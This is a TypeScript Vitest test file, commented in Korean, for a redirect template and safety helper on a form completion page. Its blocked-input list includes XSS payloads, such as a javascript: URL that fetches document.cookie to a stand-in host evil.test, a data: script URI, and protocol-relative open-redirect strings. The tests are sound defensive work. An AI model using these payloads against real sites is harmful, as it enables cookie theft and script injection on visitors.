import { describe, expect, it } from "vitest";
import { fillRedirectTemplate, resolveRedirect, safeRedirectTarget } from "@/lib/collect-redirect";

/**
 * 완료 페이지 이동(설계 §8).
 *
 * 두 가지를 지킨다: **URL 조건 전환이 실제로 맞게 만들어지는가**(값 인코딩), 그리고
 * **운영자가 넣은 문자열이 방문자 브라우저에서 무엇이든 하지 못하는가**(스킴 검사).
 */

describe("템플릿 치환", () => {
  it("네 자리표시자를 모두 채운다", () => {
    const out = fillRedirectTemplate(
      "https://x.test/done?type={type}&rid={rid}&n={regNo}&l={lang}",
      { type: "Buyer", rid: "r1", regNo: "1234567890128", lang: "en" },
    );
    expect(out).toBe("https://x.test/done?type=Buyer&rid=r1&n=1234567890128&l=en");
  });

  /**
   * 유형 라벨은 운영자가 자유롭게 적는다 — 그대로 이어 붙이면 쿼리스트링이 깨지고
   * 완료 페이지가 파라미터를 잘못 읽어 전환 조건이 조용히 안 맞는다.
   */
  it("값을 인코딩한다", () => {
    expect(fillRedirectTemplate("https://x.test/?t={type}", { type: "Buyer & Press" }))
      .toBe("https://x.test/?t=Buyer%20%26%20Press");
    expect(fillRedirectTemplate("https://x.test/?t={type}", { type: "바이어" }))
      .toContain("%EB%B0%94%EC%9D%B4%EC%96%B4");
  });

  /** §8 의 `?buyer` 형식 — 값만 붙는 자리도 그대로 동작해야 한다. */
  it("값만 붙는 형식도 만든다", () => {
    expect(fillRedirectTemplate("https://x.test/done?{type}", { type: "buyer" }))
      .toBe("https://x.test/done?buyer");
  });

  it("주지 않은 값은 빈 문자열이 된다 — 자리표시자가 그대로 남으면 안 된다", () => {
    expect(fillRedirectTemplate("https://x.test/?n={regNo}", {})).toBe("https://x.test/?n=");
  });
});

describe("이동 안전 검사", () => {
  it("http(s) 절대 주소를 통과시킨다", () => {
    expect(safeRedirectTarget("https://x.test/done")).toBe("https://x.test/done");
    expect(safeRedirectTarget("http://x.test/done")).toBe("http://x.test/done");
  });

  /** 연동형에 실제로 저장돼 있는 모양 — 막으면 살아 있는 소스의 이동이 조용히 끊긴다. */
  it("같은 오리진 상대경로를 통과시킨다", () => {
    expect(safeRedirectTarget("/thank-you")).toBe("/thank-you");
    expect(safeRedirectTarget("/done?type=buyer")).toBe("/done?type=buyer");
  });

  /** javascript: 는 파트너 오리진에서 임의 JS 를 실행한다 — 쿠키·폼 값이 그 자리에 있다. */
  it("실행 가능한 스킴을 막는다", () => {
    for (const bad of [
      "javascript:alert(1)",
      "JavaScript:fetch('//evil.test/'+document.cookie)",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox",
    ]) expect(safeRedirectTarget(bad)).toBeNull();
  });

  /** `//evil.test` 는 상대경로처럼 생겼지만 다른 호스트로 간다(오픈 리다이렉트). */
  it("프로토콜 상대 주소를 막는다", () => {
    expect(safeRedirectTarget("//evil.test/pay")).toBeNull();
    expect(safeRedirectTarget("  //evil.test")).toBeNull();
  });

  it("빈 값·형식이 아닌 값은 이동하지 않는다", () => {
    for (const bad of ["", "   ", "not a url", "ftp://x.test/f"]) {
      expect(safeRedirectTarget(bad)).toBeNull();
    }
  });
});

describe("resolveRedirect", () => {
  it("채운 뒤에 검사한다 — 치환 결과가 위험하면 이동하지 않는다", () => {
    // 자리표시자로 스킴을 만들 수는 없다(인코딩되므로) — 그래도 최종 문자열을 본다.
    expect(resolveRedirect("{type}", { type: "javascript:alert(1)" })).toBeNull();
    expect(resolveRedirect("https://x.test/?t={type}", { type: "Buyer" }))
      .toBe("https://x.test/?t=Buyer");
  });
});
